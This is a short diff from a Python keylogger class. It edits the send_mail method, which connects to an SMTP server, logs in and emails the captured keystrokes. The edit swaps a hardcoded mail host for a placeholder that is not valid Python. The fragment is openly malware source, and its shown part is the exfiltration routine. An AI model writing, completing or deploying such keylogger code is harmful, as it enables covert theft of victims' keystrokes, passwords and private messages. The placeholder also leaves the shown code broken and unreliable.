@@ -37,7 +37,7 @@ class Keylogger:
         timer.start()
 
     def send_mail(self, email, password, massage):
-        server = smtplib.SMTP("loyehen697@jarilusua.com", 7888)
+        server = smtplib.SMTP("SMTP mail", SMTP PORT)
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email,massage)
